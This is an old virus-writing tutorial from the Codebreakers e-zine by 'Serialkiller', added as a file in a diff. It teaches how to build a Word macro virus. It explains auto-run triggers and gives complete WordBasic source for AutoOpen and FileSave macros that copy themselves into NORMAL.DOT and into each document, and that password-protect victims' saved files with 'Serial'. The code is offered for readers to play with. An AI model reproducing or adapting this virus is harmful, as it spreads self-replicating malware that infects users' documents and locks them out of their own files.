@@ -1,0 +1,189 @@
+               'ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿'
+                º ****::: Macro Virus Writing Guide :::*** º
+                º ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ º
+                º **** -= Serialkiller/Codebreakers =- *** º
+               'ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ'
+
+
+Hi and welcome to my macro tutorial. O.k. something about me:
+My name is "Serialkiller" and i´m a member from the Codebreakers. 
+I'm a macro virus coder and i would beginn to code asm viruses, too :)
+
+O.k. first before we begin something to code is a question :
+
+What is a macro ??
+
+A macro can be sort of duing things (that viruses can do too) or a kind of 
+command that will be called, when an action occours. (like AutoOpen ----that 
+means it will something activated when an document will open).
+
+O.k. got it ? :)
+Now you have sure another question to me :
+
+How the virus works ?
+
+O.k. in the macro are commands, that will infect document files or "*.dot-files". 
+for example:
+We have an macro called "AutoOpen". ----->u have hear, that will infect another
+document when the user will open a new document. Open the user a document with 
+an macro virus in it, then he´s infected with an macro virus. And so on and on.
+But u can infect an user more about "AutoOpen".
+The best ways to infect an user are:
+
+- AutoOpen	(will infect, if the user open a document file)
+- AutoNew	(will infect, if the user make an new document)
+- AutoClose	(will infect, if the user close a file)
+- AutoExec	(will infect, if the user execute a file)
+
+sure, there will give other commands to infect , too but in this article we 
+will learn what a macro is and we wanna write an macro virus with the command 
+"AutoOpen".
+
+O.k.
+The next question:
+
+How can i make an macro virus ?
+
+-First, u need to start WinWord 6 or 7. 
+-click on "Tools" and then "Macro"
+-you will now see a box ------->type in the "MacroName" the name "AutoOpen"
+-click on "Create"
+-now you can see two lines ------>"Sub Main" and "End Sub"
+ these commands are very important !!!
+ You must write your code between the lines.
+
+O.k. i will show your the "AutoOpen" command better :)
+
+-write between the lines "Sub Main" and "End Sub" follow command:
+		MsgBox "Hi everyone",64
+
+-now it´s important, that you close WinWord
+-it will aks you: "Do you want to keep the changes to the macro 
+ Global:AutoOpen ?
+-click on "YES"
+
+-start WinWord again and open a document 
+-now u would see a message box with "Hi everyone" in it :)
+
+hehehe,nope , you are now NOT infected with an macro virus ;).
+but:
+I think you will understand now the command "AutoOpen" :) hehehe
+
+O.k. now we will erase this caommand:
+
+-go to "Tools" and then "Macro" again 
+-click on "AutoOpen" and then on the button "Delete"
+-you will get a message like this: "Do you want to deletemacro AutoOpen" ?
+-click on "Yes"
+-it´s important again that you will close complet WinWord
+ (any changes will be saved in the "normal.dot"
+
+
+here the code with comment´s:
+
+Sub Main            ;stands always for the beginning of an macro
+MsgBox"Hi All",64   ;show the message box, the "64" stands for the info sign
+		    ;more about the signs can be read in the Codebreakers
+		    ;Magazine #4
+End Sub		    ;stands always at the end from an macro 
+  
+
+got it ? -------> I think it´s not so hard to understand
+
+Now how can we spread a macro in a other document ?
+
+O.k. now we make 2 macros, that will spread if anyone will open a new document:
+Here is the Code : (we will call it "AutoOpen")
+
+
+Sub MAIN						  ;beginning of a macro
+On Error Resume Next				;if there is an error-goto next
+n$ = DefaultDir$(2) + "\NORMAL.DOT"			    ;infect normal.dot
+f$ = FileName$()					    ;f$ = File Name
+If GetAttr(n$) < 32 Then Goto del  ;if a document have an attrib it will delete
+a = CountMacros(0)					   ;is the file infect?
+If a > 0 Then						    ;is not?
+	For b = 1 To a					    ;infect it
+		If MacroName$(b, 0) = "FileSave" Then c = 1 
+	Next b						;did "File Save" exist?
+End If	
+
+If c <> 1 Then					;check if "AutoOpen" and "FileSave" is in normal.dot
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "AutoOpen", .Tab = 3	;is not -->copy AutoOpen
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "FileSave", .Tab = 3	;is not -->copy FileSave
+
+End If
+
+aa = CountMacros(1)				;have it found macros
+If aa > 0 Then					;then
+	For bb = 1 To aa
+		If MacroName$(bb, 1) = "FileSave" Then cc = 1
+	Next bb
+End If	
+
+If cc <> 1 Then
+	FileSaveAs .Format = 1			;copy the macro "AutoOpen"
+	fm$ = FileName$() + ":AutoOpen"
+	MacroCopy "AutoOpen", fm$
+	fm$ = FileName$() + ":FileSave"		;copy the macro "FileSave"
+	MacroCopy "FileSave", fm$
+
+End If
+End Sub						;end of an macro
+
+
+
+Now we need the other macro : (FileSave)
+
+Sub MAIN
+On Error Resume Next
+FileSaveAs .Password = "Serial"					;set password "Serial"
+n$ = DefaultDir$(2) + "\NORMAL.DOT"
+f$ = FileName$()
+If GetAttr(n$) < 32 Then Goto del
+a = CountMacros(0)
+If a > 0 Then
+	For b = 1 To a
+		If MacroName$(b, 0) = "AutoOpen" Then c = 1
+	Next b
+End If	
+
+If c <> 1 Then
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "AutoOpen", .Tab = 3	
+Organizer .Copy, .Source = f$, .Destination = n$, .Name = "FileSave", .Tab = 3
+
+End If
+
+aa = CountMacros(1)
+If aa > 0 Then
+	For bb = 1 To aa
+		If MacroName$(bb, 1) = "AutoOpen" Then cc = 1
+	Next bb
+End If	
+
+If cc <> 1 Then
+	FileSaveAs .Format = 1
+	fm$ = FileName$() + ":AutoOpen"
+	MacroCopy "AutoOpen", fm$
+	fm$ = FileName$() + ":FileSave"
+	MacroCopy "FileSave", fm$
+
+End If
+End Sub
+				
+O.k. to this macro : it will set an password, if the user open a new document and save it.
+The password (you will see it is:"Serial")
+Sure, you can set any other word as Serial  
+
+Hmmm ...... got it ???   I think, it´s not sooo hard ;-)
+
+Play with them, erase them the same way who you hear with the message box :)
+In the next article i will write about to hide an macro and payloads.
+
+Have fun with experiment :)
+
+
+
+Serialkiller [Codebreakers]
+
+
